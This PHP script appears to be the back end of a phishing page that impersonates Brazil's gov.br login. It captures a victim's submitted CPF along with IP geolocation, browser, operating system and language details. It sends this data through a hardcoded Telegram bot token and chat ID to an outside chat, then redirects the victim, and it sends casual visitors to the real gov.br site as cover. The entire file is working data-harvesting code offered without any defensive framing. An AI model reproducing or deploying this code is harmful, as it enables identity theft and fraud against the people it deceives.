<?php

function getIpInfo($ip) {
    $apiUrl = "http://ip-api.com/json/{$ip}";
    $apiData = file_get_contents($apiUrl);
    return json_decode($apiData, true);
}

function getBrowserNameAndOs($userAgent) {
    $browser = "Desconhecido";
    if (preg_match('/Firefox/i', $userAgent)) {
        $browser = 'Firefox';
    } elseif (preg_match('/MSIE/i', $userAgent) || preg_match('/Trident/i', $userAgent)) {
        $browser = 'Internet Explorer';
    } elseif (preg_match('/Edge/i', $userAgent)) {
        $browser = 'Microsoft Edge';
    } elseif (preg_match('/Chrome/i', $userAgent)) {
        $browser = 'Google Chrome';
    } elseif (preg_match('/Safari/i', $userAgent)) {
        $browser = 'Safari';
    } elseif (preg_match('/Opera|OPR/i', $userAgent)) {
        $browser = 'Opera';
    }
    
    $os = "Desconhecido";
    if (preg_match('/linux/i', $userAgent)) {
        $os = 'Linux';
    } elseif (preg_match('/macintosh|mac os x/i', $userAgent)) {
        $os = 'MacOS';
    } elseif (preg_match('/windows|win32/i', $userAgent)) {
        $os = 'Windows';
    }
    
    return array($browser, $os);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['cpf'])) {
        $cpf = $_POST['cpf'];
        $dataHora = date('Y-m-d H:i:s');
        $ip = $_SERVER['REMOTE_ADDR'];
        $porta = $_SERVER['REMOTE_PORT'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $linguao = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'N/A';
        list($navegador, $os) = getBrowserNameAndOs($userAgent);
        $ipInfo = getIpInfo($ip);
        
        $protocolo = (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') ? "HTTPS" : "HTTP";

        $conteudo = "🦆 | LOG DUCKETTSTONE\n\n";
        $conteudo .= "📌 | CPF: $cpf\n";
        $conteudo .= "🏠 | IP: " . $ipInfo['query'] . "\n🔎 | Cidade: " . $ipInfo['city'] . "\n📍 | Região: " . $ipInfo['regionName'] . "\n🌎 | País: " . $ipInfo['country'] . "\n📦 | ISP: " . $ipInfo['isp'] . "\n\n";
        $conteudo .= "🔓 | USER-AGENT: $userAgent\n";
        $conteudo .= "🌐 | NAVEGADOR: $navegador\n";
        $conteudo .= "💻 | SISTEMA OPERACIONAL: $os\n";
        $conteudo .= "🚪 | PORTA: $porta\n";
        $conteudo .= "🔒 | PROTOCOLO: $protocolo\n";
        $conteudo .= "👥 | LINGUAGEM: $linguao\n";
        $conteudo .= "📆 | DATA/HORA: $dataHora\n\n";

        $botToken = '7314565146:AAHTmAZAhdce3zgiS150Z13IOCoo10JWV84';
        $chatId = '1589421882';

        $mensagem = urlencode($conteudo);
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$mensagem}";

        $response = file_get_contents($url);

        if ($response !== false) {
            header('Location: index.html'); 
            exit();
        } else {
            echo "Houve um erro ao enviar os dados. Tente novamente.";
        }
    } else {
        echo "Por favor, preencha todos os campos do formulário.";
    }
} else {
    header('Location: https://sso.acesso.gov.br/'); 
    exit();
}
?>
